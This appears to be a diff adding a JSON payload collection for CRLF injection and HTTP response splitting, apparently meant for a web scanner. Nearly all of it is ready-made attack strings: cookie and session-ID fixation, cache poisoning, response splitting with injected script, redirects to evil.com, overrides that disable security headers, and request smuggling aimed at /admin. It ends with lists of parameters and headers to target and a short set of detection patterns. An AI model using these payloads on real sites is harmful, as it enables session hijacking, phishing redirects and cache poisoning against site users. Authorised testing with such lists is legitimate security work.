@@ -1,0 +1,94 @@
+{
+  "info": {
+    "name": "CRLF Injection Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "CRLF injection and HTTP Response Splitting payloads for header injection, cache poisoning, and session fixation. 2026 updated.",
+    "category": "Injection",
+    "severity": "MEDIUM",
+    "owasp": "A03:2021 - Injection"
+  },
+  "payloads": {
+    "basic_header_injection": [
+      {"payload": "%0d%0aX-Injected: header", "description": "Basic CRLF injection", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aSet-Cookie: evil=1", "description": "Cookie injection", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aLocation: https://evil.com", "description": "Redirect injection", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "\r\nX-Injected: header", "description": "Raw CRLF injection", "encoding": "raw", "target": "url_param", "risk": "HIGH"},
+      {"payload": "\r\nSet-Cookie: evil=1", "description": "Raw cookie injection", "encoding": "raw", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0a%0aX-Injected: header", "description": "Double LF injection", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%250d%250aX-Injected: header", "description": "Double URL encode", "encoding": "double_url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0a%0d%0aX-Injected: header", "description": "Double CRLF (header end)", "encoding": "url", "target": "url_param", "risk": "HIGH"}
+    ],
+    "cache_poisoning": [
+      {"payload": "%0d%0aCache-Control: no-cache%0d%0aX-Cache: MISS", "description": "Cache control poisoning", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aPragma: no-cache%0d%0aX-Cache: HIT", "description": "Pragma poisoning", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aCache-Control: max-age=0%0d%0aX-Cache: evil", "description": "Cache max-age poisoning", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aVary: *%0d%0aX-Cache: INJECTED", "description": "Vary header poisoning", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aExpires: Thu, 01 Jan 2030 00:00:00 GMT", "description": "Long cache expiration", "encoding": "url", "target": "url_param", "risk": "LOW"}
+    ],
+    "session_fixation": [
+      {"payload": "%0d%0aSet-Cookie: PHPSESSID=evil123", "description": "PHP session fixation", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aSet-Cookie: JSESSIONID=evil123", "description": "Java session fixation", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aSet-Cookie: SESSION_ID=evil123", "description": "Generic session fixation", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aSet-Cookie: auth=evil123; Path=/; HttpOnly", "description": "Auth cookie fixation", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aSet-Cookie: _csrf=evil123", "description": "CSRF token overwrite", "encoding": "url", "target": "url_param", "risk": "HIGH"}
+    ],
+    "response_splitting": [
+      {"payload": "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Length: 0%0d%0a%0d%0a", "description": "HTTP version injection", "encoding": "url", "target": "url_param", "risk": "CRITICAL"},
+      {"payload": "%0d%0a%0d%0a<script>alert(1)</script>", "description": "HTML injection after split", "encoding": "url", "target": "url_param", "risk": "CRITICAL"},
+      {"payload": "%0d%0a%0d%0aHTTP/1.1 302 Found%0d%0aLocation: https://evil.com", "description": "Redirect split", "encoding": "url", "target": "url_param", "risk": "CRITICAL"},
+      {"payload": "200%0d%0aContent-Type: text/html%0d%0a%0d%0a<p>INJECTED", "description": "Full response injection", "encoding": "url", "target": "url_param", "risk": "CRITICAL"}
+    ],
+    "open_redirect": [
+      {"payload": "%0d%0aLocation: https://evil.com", "description": "Open redirect via Location", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aRefresh: 0;url=https://evil.com", "description": "Open redirect via Refresh", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>location='https://evil.com'", "description": "JS redirect after split", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "https://legit.com%0d%0aX-Injected: x%0d%0aLocation: https://evil.com", "description": "Redirect chain injection", "encoding": "url", "target": "url_param", "risk": "HIGH"}
+    ],
+    "content_type_manipulation": [
+      {"payload": "%0d%0aContent-Type: text/html", "description": "HTML content type override", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aContent-Type: application/json", "description": "JSON content type override", "encoding": "url", "target": "url_param", "risk": "LOW"},
+      {"payload": "%0d%0aContent-Type: application/xml", "description": "XML content type override", "encoding": "url", "target": "url_param", "risk": "LOW"},
+      {"payload": "%0d%0aX-Content-Type-Options: nosniff", "description": "Content type options", "encoding": "url", "target": "url_param", "risk": "LOW"},
+      {"payload": "%0d%0aContent-Encoding: identity", "description": "Content encoding override", "encoding": "url", "target": "url_param", "risk": "LOW"}
+    ],
+    "security_header_bypass": [
+      {"payload": "%0d%0aX-XSS-Protection: 0", "description": "XSS protection disable", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aX-Frame-Options: ALLOWALL", "description": "Clickjacking enable", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aContent-Security-Policy: *", "description": "CSP bypass", "encoding": "url", "target": "url_param", "risk": "HIGH"},
+      {"payload": "%0d%0aAccess-Control-Allow-Origin: *", "description": "CORS bypass", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0aX-WebKit-CSP: *", "description": "WebKit CSP bypass", "encoding": "url", "target": "url_param", "risk": "MEDIUM"}
+    ],
+    "http_smuggling_te_cl": [
+      {"payload": "0\r\n\r\n", "description": "TE.CL chunked 0", "encoding": "raw", "target": "body", "risk": "HIGH"},
+      {"payload": "GET /admin HTTP/1.1\r\nHost: target.com", "description": "Smuggled GET request", "encoding": "raw", "target": "body", "risk": "CRITICAL"},
+      {"payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\n\r\nGET /x", "description": "TE.CL smuggling basic", "encoding": "raw", "target": "body", "risk": "CRITICAL"}
+    ],
+    "encoding_variations": [
+      {"payload": "%0D%0AX-Injected: header", "description": "Uppercase CR LF URL", "encoding": "url_upper", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%0d%0AX%09Injected: header", "description": "Tab injection instead of space", "encoding": "url", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "%E0%80%8aX-Injected: header", "description": "Overlong UTF-8 encoding", "encoding": "overlong", "target": "url_param", "risk": "MEDIUM"},
+      {"payload": "\\r\\nX-Injected: header", "description": "Backslash escaped CRLF", "encoding": "escaped", "target": "url_param", "risk": "LOW"},
+      {"payload": "&#x0d;&#x0a;X-Injected: header", "description": "HTML entity encoding", "encoding": "html_entity", "target": "url_param", "risk": "LOW"}
+    ]
+  },
+  "detection_patterns": [
+    "x-injected",
+    "x-cache.*injected",
+    "set-cookie.*evil",
+    "location.*evil",
+    "crlf injection",
+    "http response splitting",
+    "duplicate headers",
+    "header injection"
+  ],
+  "parameters": [
+    "url", "next", "redirect", "redir", "destination", "return", "callback",
+    "uri", "path", "continue", "window", "target", "out", "view", "val",
+    "validate", "domain", "page", "feed", "host", "port", "to", "out", "dir"
+  ],
+  "header_injection_targets": [
+    "Location", "Set-Cookie", "Refresh", "Content-Type", "Server",
+    "X-Forwarded-For", "X-Real-IP", "X-Rewrite-URL", "Host"
+  ]
+}
